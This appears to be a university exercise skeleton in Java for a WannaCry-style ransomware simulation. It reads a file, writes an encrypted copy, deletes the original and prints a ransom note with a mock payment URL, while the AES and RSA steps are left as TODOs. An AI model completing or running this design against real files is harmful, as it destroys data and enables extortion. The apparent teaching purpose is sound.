package le.ac.uk.WannaCry;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

public class WannaCry {
    public static void main(String[] args) {
        // TODO - Generate a random 256-bit AES key


        byte[] fileBytes = null;
        try (FileInputStream fis = new FileInputStream("test.txt")) {
            fileBytes = fis.readAllBytes();
        } catch (FileNotFoundException e) {
            System.out.println("File not found: " + e.getMessage());
        } catch (IOException e) {
            System.out.println("Error reading file: " + e.getMessage());
        }
        if (fileBytes == null) return;

        // TODO - Encrypt contents using AES key in CBC mode with PKCS5 padding (IV used is 16 empty bytes)
        byte[] encryptedFileBytes = null;


        try (FileOutputStream fos = new FileOutputStream("test.txt.cry")) {
            if (encryptedFileBytes != null) fos.write(encryptedFileBytes);
        } catch (IOException e) {
            System.out.println("Error writing encrypted file: " + e.getMessage());
            return;
        }

        try {
            Files.delete(Path.of("test.txt"));
        } catch (IOException e) {
            System.out.println("Error deleting file: " + e.getMessage());
            return;
        }

        // TODO - Construct public key from masterPublicKeyBase64
        String masterPublicKeyBase64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";


        // TODO - Encrypt AES key bytes with RSA using the master public key


        // TODO - Store encrypted AES key bytes in aes.key


        String ransomMessage = """
                Dear User! Please note that your files have now been encrypted.
                To recover your files we ask you to follow the instructions\s
                in the website below to arrange a small payment:
                https://www.notascamwepromise.le.ac.uk/wannaCry
                """;
        System.out.println(ransomMessage);
        return;
    }
}
